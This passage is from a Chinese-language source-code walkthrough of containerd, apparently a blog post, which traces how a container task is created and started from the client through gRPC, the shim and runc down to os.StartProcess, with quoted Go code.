tracing.StartSpan(ctx, \u0026#34;container.NewTask\u0026#34;) defer span.End() i, err := ioCreate(c.id) if err != nil { return nil, err } defer func() { if err != nil \u0026amp;\u0026amp; i != nil { i.Cancel() i.Close() } }() cfg := i.Config() request := \u0026amp;tasks.CreateTaskRequest{ ContainerID: c.id, Terminal: cfg.Terminal, Stdin: cfg.Stdin, Stdout: cfg.Stdout, Stderr: cfg.Stderr, } r, err := c.get(ctx) if err != nil { return nil, err } if r.SnapshotKey != \u0026#34;\u0026#34; { if r.Snapshotter == \u0026#34;\u0026#34; { return nil, fmt.Errorf(\u0026#34;unable to resolve rootfs mounts without snapshotter on container: %w\u0026#34;, errdefs.ErrInvalidArgument) } // get the rootfs from the snapshotter and add it to the request s, err := c.client.getSnapshotter(ctx, r.Snapshotter) if err != nil { return nil, err } mounts, err := s.Mounts(ctx, r.SnapshotKey) if err != nil { return nil, err } spec, err := c.Spec(ctx) if err != nil { return nil, err } for _, m := range mounts { if spec.Linux != nil \u0026amp;\u0026amp; spec.Linux.MountLabel != \u0026#34;\u0026#34; { if ml := label.FormatMountLabel(\u0026#34;\u0026#34;, spec.Linux.MountLabel); ml != \u0026#34;\u0026#34; { m.Options = append(m.Options, ml) } } request.Rootfs = append(request.Rootfs, \u0026amp;types.Mount{ Type: m.Type, Source: m.Source, Target: m.Target, Options: m.Options, }) } } info := TaskInfo{ runtime: r.Runtime.Name, } for _, o := range opts { if err := o(ctx, c.client, \u0026amp;info); err != nil { return nil, err } } for _, m := range info.RootFS { request.Rootfs = append(request.Rootfs, \u0026amp;types.Mount{ Type: m.Type, Source: m.Source, Target: m.Target, Options: m.Options, }) } request.RuntimePath = info.RuntimePath if info.Options != nil { o, err := typeurl.MarshalAny(info.Options) if err != nil { return nil, err } request.Options = typeurl.MarshalProto(o) } t := \u0026amp;task{ client: c.client, io: i, id: c.id, c: c, } if info.Checkpoint != nil { request.Checkpoint = info.Checkpoint } span.SetAttributes( tracing.Attribute(\u0026#34;task.container.id\u0026#34;, request.ContainerID), tracing.Attribute(\u0026#34;task.request.options\u0026#34;, request.Options.String()), tracing.Attribute(\u0026#34;task.runtime.name\u0026#34;, info.runtime), ) response, err := c.client.TaskService().Create(ctx, request) if err != nil { return nil, errdefs.FromGRPC(err) } span.AddEvent(\u0026#34;task created\u0026#34;, tracing.Attribute(\u0026#34;task.process.id\u0026#34;, int(response.Pid)), ) t.pid = response.Pid return t, nil } 3、Taskservice获取TasksClient实例\n1 2 3 4 5 6 7 8 9 // TaskService returns the underlying TasksClient func (c *Client) TaskService() tasks.TasksClient { if c.taskService != nil { return c.taskService } c.connMu.Lock() defer c.connMu.Unlock() return tasks.NewTasksClient(c.conn) } 3、通过gRPC发送给containerd\n源码路径：containerd/api/services/tasks/v1/tasks_grpc.pb.go\n1 2 3 4 5 6 7 8 func (c *tasksClient) Create(ctx context.Context, in *CreateTaskRequest, opts ...grpc.CallOption) (*CreateTaskResponse, error) { out := new(CreateTaskResponse) err := c.cc.Invoke(ctx, \u0026#34;/containerd.services.tasks.v1.Tasks/Create\u0026#34;, in, out, opts...) if err != nil { return nil, err } return out, nil } 3、containerd接收并处理请求\n源码路径：containerd/api/services/tasks/v1/tasks_grpc.pb.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 func _Tasks_Create_Handler(srv interface{}, ctx context.Context, dec func(interface{}) error, interceptor grpc.UnaryServerInterceptor) (interface{}, error) { in := new(CreateTaskRequest) if err := dec(in); err != nil { return nil, err } if interceptor == nil { return srv.(TasksServer).Create(ctx, in) } info := \u0026amp;grpc.UnaryServerInfo{ Server: srv, FullMethod: \u0026#34;/containerd.services.tasks.v1.Tasks/Create\u0026#34;, } handler := func(ctx context.Context, req interface{}) (interface{}, error) { return srv.(TasksServer).Create(ctx, req.(*CreateTaskRequest)) } return interceptor(ctx, in, info, handler) } 3、实际调用local的相关函数处理（这里也有对象的转换）\n源码路径：containerd/plugins/services/tasks/local.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 func (l *local) Create(ctx context.Context, r *api.CreateTaskRequest, _ ...grpc.CallOption) (*api.CreateTaskResponse, error) { container, err := l.getContainer(ctx, r.ContainerID) if err != nil { return nil, errdefs.ToGRPC(err) } var ( checkpointPath string taskAPIAddress string taskAPIVersion uint32 ) if r.Options != nil { taskOptions, err := formatOptions(container.Runtime.Name, r.Options) if err != nil { return nil, err } checkpointPath = taskOptions.CriuImagePath taskAPIAddress = taskOptions.TaskApiAddress taskAPIVersion = taskOptions.TaskApiVersion } // jump get checkpointPath from checkpoint image if checkpointPath == \u0026#34;\u0026#34; \u0026amp;\u0026amp; r.Checkpoint != nil { checkpointPath, err = os.MkdirTemp(os.Getenv(\u0026#34;XDG_RUNTIME_DIR\u0026#34;), \u0026#34;ctrd-checkpoint\u0026#34;) if err != nil { return nil, err } if r.Checkpoint.MediaType != images.MediaTypeContainerd1Checkpoint { return nil, fmt.Errorf(\u0026#34;unsupported checkpoint type %q\u0026#34;, r.Checkpoint.MediaType) } reader, err := l.store.ReaderAt(ctx, ocispec.Descriptor{ MediaType: r.Checkpoint.MediaType, Digest: digest.Digest(r.Checkpoint.Digest), Size: r.Checkpoint.Size, Annotations: r.Checkpoint.Annotations, }) if err != nil { return nil, err } _, err = archive.Apply(ctx, checkpointPath, content.NewReader(reader)) reader.Close() if err != nil { return nil, err } } opts := runtime.CreateOpts{ Spec: container.Spec, IO: runtime.IO{ Stdin: r.Stdin, Stdout: r.Stdout, Stderr: r.Stderr, Terminal: r.Terminal, }, Checkpoint: checkpointPath, Runtime: container.Runtime.Name, RuntimeOptions: container.Runtime.Options, TaskOptions: r.Options, SandboxID: container.SandboxID, Address: taskAPIAddress, Version: taskAPIVersion, } if r.RuntimePath != \u0026#34;\u0026#34; { opts.Runtime = r.RuntimePath } for _, m := range r.Rootfs { opts.Rootfs = append(opts.Rootfs, mount.Mount{ Type: m.Type, Source: m.Source, Target: m.Target, Options: m.Options, }) } rtime := l.v2Runtime _, err = rtime.Get(ctx, r.ContainerID) if err != nil \u0026amp;\u0026amp; !errdefs.IsNotFound(err) { return nil, errdefs.ToGRPC(err) } if err == nil { return nil, errdefs.ToGRPC(fmt.Errorf(\u0026#34;task %s: %w\u0026#34;, r.ContainerID, errdefs.ErrAlreadyExists)) } c, err := rtime.Create(ctx, r.ContainerID, opts) if err != nil { return nil, errdefs.ToGRPC(err) } labels := map[string]string{\u0026#34;runtime\u0026#34;: container.Runtime.Name} if err := l.monitor.Monitor(c, labels); err != nil { return nil, fmt.Errorf(\u0026#34;monitor task: %w\u0026#34;, err) } pid, err := c.PID(ctx) if err != nil { return nil, fmt.Errorf(\u0026#34;failed to get task pid: %w\u0026#34;, err) } return \u0026amp;api.CreateTaskResponse{ ContainerID: r.ContainerID, Pid: pid, }, nil } 3、调用runtime.PlatformRuntime.create，PlatformRuntime接口实际由TaskManager实现，也就是TaskManager.Create。Create函数的关键调用流程有点多，我们一一分析。\n1.m.manager.Start()\n2.newShimTask(shim)\n3.shimTask.Create()\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 //源码路径：containerd\\containerd\\core\\runtime\\v2\\task_manager.go // Create launches new shim instance and creates new task func (m *TaskManager) Create(ctx context.Context, taskID string, opts runtime.CreateOpts) (_ runtime.Task, retErr error) { bundle, err := NewBundle(ctx, m.root, m.state, taskID, opts.Spec) if err != nil { return nil, err } defer func() { if retErr != nil { bundle.Delete() } }() shim, err := m.manager.Start(ctx, taskID, bundle, opts) if err != nil { return nil, fmt.Errorf(\u0026#34;failed to start shim: %w\u0026#34;, err) } // Cast to shim task and call task service to create a new container task instance. // This will not be required once shim service / client implemented. shimTask, err := newShimTask(shim) if err != nil { return nil, err } // runc ignores silently features it doesn\u0026#39;t know about, so for things that this is // problematic let\u0026#39;s check if this runc version supports them. if err := m.validateRuntimeFeatures(ctx, opts); err != nil { return nil, fmt.Errorf(\u0026#34;failed to validate OCI runtime features: %w\u0026#34;, err) } t, err := shimTask.Create(ctx, opts) if err != nil { // NOTE: ctx contains required namespace information. m.manager.shims.Delete(ctx, taskID) dctx, cancel := timeout.WithContext(cleanup.Background(ctx), cleanupTimeout) defer cancel() sandboxed := opts.SandboxID != \u0026#34;\u0026#34; _, errShim := shimTask.delete(dctx, sandboxed, func(context.Context, string) {}) if errShim != nil { if errdefs.IsDeadlineExceeded(errShim) { dctx, cancel = timeout.WithContext(cleanup.Background(ctx), cleanupTimeout) defer cancel() } shimTask.Shutdown(dctx) shimTask.Close() } return nil, fmt.Errorf(\u0026#34;failed to create shim task: %w\u0026#34;, err) } return t, nil } 3.1、m.manager.Start()调用ShimManager.Start\ncontainerd\\containerd\\core\\runtime\\v2\\shim_manager.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 // Start launches a new shim instance func (m *ShimManager) Start(ctx context.Context, id string, bundle *Bundle, opts runtime.CreateOpts) (_ ShimInstance, retErr error) { // This container belongs to sandbox which supposed to be already started via sandbox API. if opts.SandboxID != \u0026#34;\u0026#34; { var params shimbinary.BootstrapParams if opts.Address != \u0026#34;\u0026#34; { // The address returned from sandbox controller should be in the form like ttrpc+unix://\u0026lt;uds-path\u0026gt; // or grpc+vsock://\u0026lt;cid\u0026gt;:\u0026lt;port\u0026gt;, we should get the protocol from the url first. protocol, address, ok := strings.Cut(opts.Address, \u0026#34;+\u0026#34;) if !ok { return nil, fmt.Errorf(\u0026#34;the scheme of sandbox address should be in \u0026#34; + \u0026#34; the form of \u0026lt;protocol\u0026gt;+\u0026lt;unix|vsock|tcp\u0026gt;, i.e. ttrpc+unix or grpc+vsock\u0026#34;) } params = shimbinary.BootstrapParams{ Version: int(opts.Version), Protocol: protocol, Address: address, } } else { // For those sandbox we can not get endpoint, // fallback to legacy implementation process, err := m.Get(ctx, opts.SandboxID) if err != nil { return nil, fmt.Errorf(\u0026#34;can\u0026#39;t find sandbox %s\u0026#34;, opts.SandboxID) } p, restoreErr := restoreBootstrapParams(process.Bundle()) if restoreErr != nil { return nil, fmt.Errorf(\u0026#34;failed to get bootstrap \u0026#34;+ \u0026#34;params of sandbox %s, %v, legacy restore error %v\u0026#34;, opts.SandboxID, err, restoreErr) } params = p } // Write sandbox ID this task belongs to. if err := os.WriteFile(filepath.Join(bundle.Path, \u0026#34;sandbox\u0026#34;), []byte(opts.SandboxID), 0600); err != nil { return nil, err } if err := writeBootstrapParams(filepath.Join(bundle.Path, \u0026#34;bootstrap.json\u0026#34;), params); err != nil { return nil, fmt.Errorf(\u0026#34;failed to write bootstrap.json for bundle %s: %w\u0026#34;, bundle.Path, err) } shim, err := loadShim(ctx, bundle, func() {}) if err != nil { return nil, fmt.Errorf(\u0026#34;failed to load sandbox task %q: %w\u0026#34;, opts.SandboxID, err) } if err := m.shims.Add(ctx, shim); err != nil { return nil, err } return shim, nil } shim, err := m.startShim(ctx, bundle, id, opts) if err != nil { return nil, err } defer func() { if retErr != nil { m.cleanupShim(ctx, shim) } }() if err := m.shims.Add(ctx, shim); err != nil { return nil, fmt.Errorf(\u0026#34;failed to add task: %w\u0026#34;, err) } return shim, nil } 3.1、上面如果SandboxID不为空，调用loadShim函数加载shim，否则调用startShim函数启动shim，这里我们分析startShim。\n源码路径：containerd\\containerd\\core\\runtime\\v2\\shim.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 func (m *ShimManager) startShim(ctx context.Context, bundle *Bundle, id string, opts runtime.CreateOpts) (*shim, error) { ns, err := namespaces.NamespaceRequired(ctx) if err != nil { return nil, err } ctx = log.WithLogger(ctx, log.G(ctx).WithField(\u0026#34;namespace\u0026#34;, ns)) topts := opts.TaskOptions if topts == nil || topts.GetValue() == nil { topts = opts.RuntimeOptions } runtimePath, err := m.resolveRuntimePath(opts.Runtime) if err != nil { return nil, fmt.Errorf(\u0026#34;failed to resolve runtime path: %w\u0026#34;, err) } b := shimBinary(bundle, shimBinaryConfig{ runtime: runtimePath, address: m.containerdAddress, ttrpcAddress: m.containerdTTRPCAddress, env: m.env, }) shim, err := b.Start(ctx, typeurl.MarshalProto(topts), func() { log.G(ctx).WithField(\u0026#34;id\u0026#34;, id).Info(\u0026#34;shim disconnected\u0026#34;) cleanupAfterDeadShim(cleanup.Background(ctx), id, m.shims, m.events, b) // Remove self from the runtime task list. Even though the cleanupAfterDeadShim() // would publish taskExit event, but the shim.Delete() would always failed with ttrpc // disconnect and there is no chance to remove this dead task from runtime task lists. // Thus it\u0026#39;s better to delete it here. m.shims.Delete(ctx, id) }) if err != nil { return nil, fmt.Errorf(\u0026#34;start failed: %w\u0026#34;, err) } return shim, nil } 3.2、newShimTask(shim)调用NewTaskClient\n1 2 3 4 5 6 7 8 9 10 11 12 13 //containerd\\containerd\\core\\runtime\\v2\\shim.go func newShimTask(shim ShimInstance) (*shimTask, error) { _, version := shim.Endpoint() taskClient, err := NewTaskClient(shim.Client(), version) if err != nil { return nil, err } return \u0026amp;shimTask{ ShimInstance: shim, task: taskClient, }, nil } 3.2、NewTaskClient()根据传入的版本号选择不同的通信框架与shim通信，并返回一个shimTask实例\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 //containerd\\containerd\\core\\runtime\\v2\\bridge.go func NewTaskClient(client interface{}, version int) (TaskServiceClient, error) { switch c := client.(type) { case *ttrpc.Client: switch version { case 2: return \u0026amp;ttrpcV2Bridge{client: v2.NewTaskClient(c)}, nil case 3: return v3.NewTTRPCTaskClient(c), nil default: return nil, fmt.Errorf(\u0026#34;containerd client supports only v2 and v3 TTRPC task client (got %d)\u0026#34;, version) } case grpc.ClientConnInterface: if version != 3 { return nil, fmt.Errorf(\u0026#34;containerd client supports only v3 GRPC task service (got %d)\u0026#34;, version) } return \u0026amp;grpcV3Bridge{v3.NewTaskClient(c)}, nil default: return nil, fmt.Errorf(\u0026#34;unsupported shim client type %T\u0026#34;, c) } } 3.3、shimTask.Create(ctx, opts)创建task\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 func (s *shimTask) Create(ctx context.Context, opts runtime.CreateOpts) (runtime.Task, error) { topts := opts.TaskOptions if topts == nil || topts.GetValue() == nil { topts = opts.RuntimeOptions } request := \u0026amp;task.CreateTaskRequest{ ID: s.ID(), Bundle: s.Bundle(), Stdin: opts.IO.Stdin, Stdout: opts.IO.Stdout, Stderr: opts.IO.Stderr, Terminal: opts.IO.Terminal, Checkpoint: opts.Checkpoint, Options: typeurl.MarshalProto(topts), } for _, m := range opts.Rootfs { request.Rootfs = append(request.Rootfs, \u0026amp;types.Mount{ Type: m.Type, Source: m.Source, Target: m.Target, Options: m.Options, }) } _, err := s.task.Create(ctx, request) if err != nil { return nil, errdefs.FromGRPC(err) } return s, nil } 3.3、task.Create根据NewTaskClient传入的版本号选择调用不同的RPC（这个NewTaskClient在前面newShimTask函数调用过），这里我们选择分析ttrpctaskClient.Create，这里调用ttRPC接口向shim发出请求。\n1 2 3 4 5 6 7 8 //containerd\\containerd\\api\\runtime\\task\\v3\\shim_ttrpc.pb.go func (c *ttrpctaskClient) Create(ctx context.Context, req *CreateTaskRequest) (*CreateTaskResponse, error) { var resp CreateTaskResponse if err := c.client.Call(ctx, \u0026#34;containerd.task.v3.Task\u0026#34;, \u0026#34;Create\u0026#34;, req, \u0026amp;resp); err != nil { return nil, err } return \u0026amp;resp, nil } 3.3、shim在之前启动后会调用RegisterTTRPC注册服务，所以会接收到containerd发出的TTRPC请求，在这里进行处理。\n源码路径：containerd\\containerd\\cmd\\containerd-shim-runc-v2\\task\\service.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 func (s *service) RegisterTTRPC(server *ttrpc.Server) error { taskAPI.RegisterTTRPCTaskService(server, s) return nil } // Create a new initial process and container with the underlying OCI runtime func (s *service) Create(ctx context.Context, r *taskAPI.CreateTaskRequest) (_ *taskAPI.CreateTaskResponse, err error) { s.mu.Lock() defer s.mu.Unlock() s.lifecycleMu.Lock() handleStarted, cleanup := s.preStart(nil) s.lifecycleMu.Unlock() defer cleanup() container, err := runc.NewContainer(ctx, s.platform, r) if err != nil { return nil, err } s.containers[r.ID] = container s.send(\u0026amp;eventstypes.TaskCreate{ ContainerID: r.ID, Bundle: r.Bundle, Rootfs: r.Rootfs, IO: \u0026amp;eventstypes.TaskIO{ Stdin: r.Stdin, Stdout: r.Stdout, Stderr: r.Stderr, Terminal: r.Terminal, }, Checkpoint: r.Checkpoint, Pid: uint32(container.Pid()), }) // The following line cannot return an error as the only state in which that // could happen would also cause the container.Pid() call above to // nil-deference panic. proc, _ := container.Process(\u0026#34;\u0026#34;) handleStarted(container, proc) return \u0026amp;taskAPI.CreateTaskResponse{ Pid: uint32(container.Pid()), }, nil } 3.3、接着调用runc.NewContainer函数\n源码路径：containerd\\containerd\\cmd\\containerd-shim-runc-v2\\runc\\container.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 // NewContainer returns a new runc container func NewContainer(ctx context.Context, platform stdio.Platform, r *task.CreateTaskRequest) (_ *Container, retErr error) { ns, err := namespaces.NamespaceRequired(ctx) if err != nil { return nil, fmt.Errorf(\u0026#34;create namespace: %w\u0026#34;, err) } opts := \u0026amp;options.Options{} if r.Options.GetValue() != nil { v, err := typeurl.UnmarshalAny(r.Options) if err != nil { return nil, err } if v != nil { opts = v.(*options.Options) } } var pmounts []process.Mount for _, m := range r.Rootfs { pmounts = append(pmounts, process.Mount{ Type: m.Type, Source: m.Source, Target: m.Target, Options: m.Options, }) } rootfs := \u0026#34;\u0026#34; if len(pmounts) \u0026gt; 0 { rootfs = filepath.Join(r.Bundle, \u0026#34;rootfs\u0026#34;) if err := os.Mkdir(rootfs, 0711); err != nil \u0026amp;\u0026amp; !os.IsExist(err) { return nil, err } } config := \u0026amp;process.CreateConfig{ ID: r.ID, Bundle: r.Bundle, Runtime: opts.BinaryName, Rootfs: pmounts, Terminal: r.Terminal, Stdin: r.Stdin, Stdout: r.Stdout, Stderr: r.Stderr, Checkpoint: r.Checkpoint, ParentCheckpoint: r.ParentCheckpoint, Options: r.Options, } if err := WriteOptions(r.Bundle, opts); err != nil { return nil, err } // For historical reason, we write opts.BinaryName as well as the entire opts if err := WriteRuntime(r.Bundle, opts.BinaryName); err != nil { return nil, err } var mounts []mount.Mount for _, pm := range pmounts { mounts = append(mounts, mount.Mount{ Type: pm.Type, Source: pm.Source, Target: pm.Target, Options: pm.Options, }) } defer func() { if retErr != nil { if err := mount.UnmountMounts(mounts, rootfs, 0); err != nil { log.G(ctx).WithError(err).Warn(\u0026#34;failed to cleanup rootfs mount\u0026#34;) } } }() if err := mount.All(mounts, rootfs); err != nil { return nil, fmt.Errorf(\u0026#34;failed to mount rootfs component: %w\u0026#34;, err) } p, err := newInit( ctx, r.Bundle, filepath.Join(r.Bundle, \u0026#34;work\u0026#34;), ns, platform, config, opts, rootfs, ) if err != nil { return nil, errdefs.ToGRPC(err) } if err := p.Create(ctx, config); err != nil { return nil, errdefs.ToGRPC(err) } container := \u0026amp;Container{ ID: r.ID, Bundle: r.Bundle, process: p, processes: make(map[string]process.Process), reservedProcess: make(map[string]struct{}), } pid := p.Pid() if pid \u0026gt; 0 { var cg interface{} if cgroups.Mode() == cgroups.Unified { g, err := cgroupsv2.PidGroupPath(pid) if err != nil { log.G(ctx).WithError(err).Errorf(\u0026#34;loading cgroup2 for %d\u0026#34;, pid) return container, nil } cg, err = cgroupsv2.Load(g) if err != nil { log.G(ctx).WithError(err).Errorf(\u0026#34;loading cgroup2 for %d\u0026#34;, pid) } } else { cg, err = cgroup1.Load(cgroup1.PidPath(pid)) if err != nil { log.G(ctx).WithError(err).Errorf(\u0026#34;loading cgroup for %d\u0026#34;, pid) } } container.cgroup = cg } return container, nil } 3.3、接着调用newInit.Create\n源码路径：containerd\\containerd\\cmd\\containerd-shim-runc-v2\\process\\init.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 // Create the process with the provided config func (p *Init) Create(ctx context.Context, r *CreateConfig) error { var ( err error socket *runc.Socket pio *processIO pidFile = newPidFile(p.Bundle) ) if r.Terminal { //这里创建一个临时的socket文件 if socket, err = runc.NewTempConsoleSocket(); err != nil { return fmt.Errorf(\u0026#34;failed to create OCI runtime console socket: %w\u0026#34;, err) } defer socket.Close() } else { if pio, err = createIO(ctx, p.id, p.IoUID, p.IoGID, p.stdio); err != nil { return fmt.Errorf(\u0026#34;failed to create init process I/O: %w\u0026#34;, err) } p.io = pio } if r.Checkpoint != \u0026#34;\u0026#34; { return p.createCheckpointedState(r, pidFile) } opts := \u0026amp;runc.CreateOpts{ PidFile: pidFile.Path(), NoPivot: p.NoPivotRoot, NoNewKeyring: p.NoNewKeyring, } if p.io != nil { opts.IO = p.io.IO() } if socket != nil { opts.ConsoleSocket = socket } if err := p.runtime.Create(ctx, r.ID, r.Bundle, opts); err != nil { return p.runtimeError(err, \u0026#34;OCI runtime create failed\u0026#34;) } if r.Stdin != \u0026#34;\u0026#34; { if err := p.openStdin(r.Stdin); err != nil { return err } } ctx, cancel := context.WithTimeout(ctx, 30*time.Second) defer cancel() if socket != nil { console, err := socket.ReceiveMaster() if err != nil { return fmt.Errorf(\u0026#34;failed to retrieve console master: %w\u0026#34;, err) } console, err = p.Platform.CopyConsole(ctx, console, p.id, r.Stdin, r.Stdout, r.Stderr, \u0026amp;p.wg) if err != nil { return fmt.Errorf(\u0026#34;failed to start console copy: %w\u0026#34;, err) } p.console = console } else { if err := pio.Copy(ctx, \u0026amp;p.wg); err != nil { return fmt.Errorf(\u0026#34;failed to start io pipe copy: %w\u0026#34;, err) } } pid, err := pidFile.Read() if err != nil { return fmt.Errorf(\u0026#34;failed to retrieve OCI runtime container pid: %w\u0026#34;, err) } p.pid = pid return nil } 3.3、接着调用runtime.Create\n源码路径：containerd\\go-runc\\runc.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 // Create creates a new container and returns its pid if it was created successfully func (r *Runc) Create(context context.Context, id, bundle string, opts *CreateOpts) error { args := []string{\u0026#34;create\u0026#34;, \u0026#34;--bundle\u0026#34;, bundle} if opts == nil { opts = \u0026amp;CreateOpts{} } oargs, err := opts.args() if err != nil { return err } args = append(args, oargs...) cmd := r.command(context, append(args, id)...) if opts.IO != nil { opts.Set(cmd) } cmd.ExtraFiles = opts.ExtraFiles if cmd.Stdout == nil \u0026amp;\u0026amp; cmd.Stderr == nil { data, err := r.cmdOutput(cmd, true, nil) defer putBuf(data) if err != nil { return fmt.Errorf(\u0026#34;%s: %s\u0026#34;, err, data.String()) } return nil } ec, err := r.startCommand(cmd) if err != nil { return err } if opts.IO != nil { if c, ok := opts.IO.(StartCloser); ok { if err := c.CloseAfterStart(); err != nil { return err } } } status, err := Monitor.Wait(cmd, ec) if err == nil \u0026amp;\u0026amp; status != 0 { err = fmt.Errorf(\u0026#34;%s did not terminate successfully: %w\u0026#34;, cmd.Args[0], \u0026amp;ExitError{status}) } return err } 3.3、接着往下调用runc.startCommand\n源码路径：containerd\\go-runc\\monitor.go\n1 2 3 4 5 6 func (r *Runc) startCommand(cmd *exec.Cmd) (chan Exit, error) { if r.PdeathSignal != 0 { return Monitor.StartLocked(cmd) } return Monitor.Start(cmd) } 3.3、再往下调用Monitor.Start\n源码路径：containerd\\containerd\\pkg\\sys\\reaper\\reaper_unix.go\n1 2 3 4 5 6 7 8 9 // Start starts the command and registers the process with the reaper func (m *Monitor) Start(c *exec.Cmd) (chan runc.Exit, error) { ec := m.Subscribe() if err := c.Start(); err != nil { m.Unsubscribe(ec) return nil, err } return ec, nil } 3.3、接着往下调用Cmd.Start，最后调用了一个系统调用os.StartProcess启动进程。\n源码路径：Go\\src\\os\\exec\\exec.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 func (c *Cmd) Start() error { // Check for doubled Start calls before we defer failure cleanup. If the prior // call to Start succeeded, we don\u0026#39;t want to spuriously close its pipes. if c.Process != nil { return errors.New(\u0026#34;exec: already started\u0026#34;) } started := false lp := c.Path c.Process, err = os.StartProcess(lp, c.argv(), \u0026amp;os.ProcAttr{ Dir: c.Dir, Files: childFiles, Env: env, Sys: c.SysProcAttr, }) started = true return nil } 3、Start函数调用RPC\ncontainerd/client/process.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 // Start starts the exec process func (p *process) Start(ctx context.Context) error { ctx, span := tracing.StartSpan(ctx, \u0026#34;process.Start\u0026#34;, tracing.WithAttribute(\u0026#34;process.id\u0026#34;, p.ID()), tracing.WithAttribute(\u0026#34;process.task.id\u0026#34;, p.task.ID()), ) defer span.End() r, err := p.task.client.TaskService().Start(ctx, \u0026amp;tasks.StartRequest{ ContainerID: p.task.id, ExecID: p.id, }) if err != nil { if p.io != nil { p.io.Cancel() p.io.Wait() p.io.Close() } return errdefs.FromGRPC(err) } span.SetAttributes(tracing.Attribute(\u0026#34;process.pid\u0026#34;, int(r.Pid))) p.pid = r.Pid return nil } 3、RPC请求shim\ncontainerd/api/runtime/task/v3/shim_grpc.pb.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 func (c *taskClient) Create(ctx context.Context, in *CreateTaskRequest, opts ...grpc.CallOption) (*CreateTaskResponse, error) { out := new(CreateTaskResponse) err := c.cc.Invoke(ctx, \u0026#34;/containerd.task.v3.Task/Create\u0026#34;, in, out, opts...) if err != nil { return nil, err } return out, nil } func (c *taskClient) Start(ctx context.Context, in *StartRequest, opts ...grpc.CallOption) (*StartResponse, error) { out := new(StartResponse) err := c.cc.Invoke(ctx, \u0026#34;/containerd.task.v3.Task/Start\u0026#34;, in, out, opts...) if err != nil { return nil, err } return out, nil } 3、shim收到请求并调用处理函数\ncontainerd/api/runtime/task/v3/shim_grpc.pb.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 func _Task_Create_Handler(srv interface{}, ctx context.Context, dec func(interface{}) error, interceptor grpc.UnaryServerInterceptor) (interface{}, error) { in := new(CreateTaskRequest) if err := dec(in); err != nil { return nil, err } if interceptor == nil { return srv.(TaskServer).Create(ctx, in) } info := \u0026amp;grpc.UnaryServerInfo{ Server: srv, FullMethod: \u0026#34;/containerd.task.v3.Task/Create\u0026#34;, } handler := func(ctx context.Context, req interface{}) (interface{}, error) { return srv.(TaskServer).Create(ctx, req.(*CreateTaskRequest)) } return interceptor(ctx, in, info, handler) } func _Task_Start_Handler(srv interface{}, ctx context.Context, dec func(interface{}) error, interceptor grpc.UnaryServerInterceptor) (interface{}, error) { in := new(StartRequest) if err := dec(in); err != nil { return nil, err } if interceptor == nil { return srv.(TaskServer).Start(ctx, in) } info := \u0026amp;grpc.UnaryServerInfo{ Server: srv, FullMethod: \u0026#34;/containerd.task.v3.Task/Start\u0026#34;, } handler := func(ctx context.Context, req interface{}) (interface{}, error) { return srv.(TaskServer).Start(ctx, req.(*StartRequest)) } return interceptor(ctx, in, info, handler) } 3、实际调用的处理函数\ncontainerd/cmd/containerd-shim-runc-v2/task/service.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 func (s *service) RegisterTTRPC(server *ttrpc.Server) error { taskAPI.RegisterTTRPCTaskService(server, s) return nil } // Create a new initial process and container with the underlying OCI runtime func (s *service) Create(ctx context.Context, r *taskAPI.CreateTaskRequest) (_ *taskAPI.CreateTaskResponse, err error) { s.mu.Lock() defer s.mu.Unlock() s.lifecycleMu.Lock() handleStarted, cleanup := s.preStart(nil) 